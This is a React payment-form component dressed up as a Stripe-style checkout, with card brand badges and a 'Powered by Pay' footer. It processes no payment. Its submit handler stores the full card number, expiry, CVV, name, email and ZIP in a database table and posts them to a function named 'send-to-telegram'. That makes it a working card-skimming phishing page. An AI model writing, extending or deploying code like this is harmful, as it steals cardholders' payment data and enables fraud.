import { useState } from "react";
import { Lock, CreditCard } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { supabase } from "@/integrations/supabase/client";

interface PaymentFormProps {
  amount: string;
  onSuccess: (sessionId: string) => void;
}

const formatCardNumber = (value: string) => {
  const digits = value.replace(/\D/g, "").slice(0, 16);
  return digits.replace(/(.{4})/g, "$1 ").trim();
};

const formatExpiry = (value: string) => {
  const digits = value.replace(/\D/g, "").slice(0, 4);
  if (digits.length >= 3) return digits.slice(0, 2) + "/" + digits.slice(2);
  return digits;
};

const PaymentForm = ({ amount, onSuccess }: PaymentFormProps) => {
  const { toast } = useToast();
  const [loading, setLoading] = useState(false);
  const [form, setForm] = useState({
    cardNumber: "",
    expiry: "",
    cvv: "",
    cardholderName: "",
    email: "",
    country: "United States",
    zip: "",
  });

  const update = (field: string, value: string) => {
    if (field === "cardNumber") value = formatCardNumber(value);
    if (field === "expiry") value = formatExpiry(value);
    if (field === "cvv") value = value.replace(/\D/g, "").slice(0, 4);
    setForm((f) => ({ ...f, [field]: value }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);

    try {
      const { data: session, error: dbError } = await supabase
        .from("sessions")
        .insert({ status: "pending", form_data: form as any })
        .select("id")
        .single();

      if (dbError || !session) throw new Error("Failed to create session");

      const res = await fetch(
        `https://${import.meta.env.VITE_SUPABASE_PROJECT_ID}.supabase.co/functions/v1/send-to-telegram`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ type: "payment", ...form, amount, sessionId: session.id }),
        }
      );

      if (!res.ok) throw new Error("Failed to process payment");
      onSuccess(session.id);
    } catch {
      toast({
        title: "Error",
        description: "Something went wrong. Please try again.",
        variant: "destructive",
      });
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="animate-fade-up">
      <form onSubmit={handleSubmit} className="space-y-6">
        {/* Email */}
        <div>
          <label className="stripe-label">Email</label>
          <input
            type="email"
            value={form.email}
            onChange={(e) => update("email", e.target.value)}
            className="stripe-input"
            placeholder="you@example.com"
            required
          />
        </div>

        {/* Card information */}
        <div>
          <label className="stripe-label">Card information</label>
          <div className="stripe-input-group">
            <div className="relative">
              <input
                value={form.cardNumber}
                onChange={(e) => update("cardNumber", e.target.value)}
                className="stripe-input-row pr-16"
                placeholder="1234 1234 1234 1234"
                required
              />
              <div className="absolute right-3 top-1/2 -translate-y-1/2 flex items-center gap-1.5">
                <div className="h-5 w-8 rounded bg-gradient-to-br from-blue-600 to-blue-800 flex items-center justify-center">
                  <span className="text-[7px] font-bold text-white tracking-wider">VISA</span>
                </div>
                <div className="h-5 w-8 rounded bg-gradient-to-br from-red-500 to-orange-400 flex items-center justify-center">
                  <div className="flex -space-x-1">
                    <div className="h-2.5 w-2.5 rounded-full bg-red-600/80" />
                    <div className="h-2.5 w-2.5 rounded-full bg-yellow-400/80" />
                  </div>
                </div>
              </div>
            </div>
            <div className="flex border-t border-input">
              <input
                value={form.expiry}
                onChange={(e) => update("expiry", e.target.value)}
                className="stripe-input-row flex-1 border-r border-input"
                placeholder="MM / YY"
                required
              />
              <div className="relative flex-1">
                <input
                  value={form.cvv}
                  onChange={(e) => update("cvv", e.target.value)}
                  className="stripe-input-row w-full pr-10"
                  placeholder="CVC"
                  required
                />
                <CreditCard className="absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground/40" />
              </div>
            </div>
          </div>
        </div>

        {/* Cardholder name */}
        <div>
          <label className="stripe-label">Cardholder name</label>
          <input
            value={form.cardholderName}
            onChange={(e) => update("cardholderName", e.target.value)}
            className="stripe-input"
            placeholder="Full name on card"
            required
          />
        </div>

        {/* Country / Region */}
        <div>
          <label className="stripe-label">Country or region</label>
          <div className="stripe-input-group">
            <select
              value={form.country}
              onChange={(e) => update("country", e.target.value)}
              className="stripe-input-row w-full appearance-none bg-card cursor-pointer"
            >
              <option>United States</option>
              <option>United Kingdom</option>
              <option>Canada</option>
              <option>Germany</option>
              <option>France</option>
              <option>Australia</option>
              <option>Japan</option>
            </select>
            <input
              value={form.zip}
              onChange={(e) => update("zip", e.target.value)}
              className="stripe-input-row border-t border-input"
              placeholder="ZIP"
              required
            />
          </div>
        </div>

        {/* Pay button */}
        <button
          type="submit"
          disabled={loading}
          className="stripe-button flex items-center justify-center gap-2"
        >
          {loading ? (
            <>
              <div className="h-4 w-4 border-2 border-primary-foreground/30 border-t-primary-foreground rounded-full animate-spin" />
              Processing...
            </>
          ) : (
            <>Pay ${amount}</>
          )}
        </button>

        {/* Footer */}
        <div className="flex items-center justify-center gap-1.5 pt-2">
          <Lock className="h-3 w-3 text-muted-foreground/50" />
          <p className="text-xs text-muted-foreground/60">
            Powered by <span className="font-semibold text-muted-foreground">Pay</span>
          </p>
        </div>
      </form>
    </div>
  );
};

export default PaymentForm;
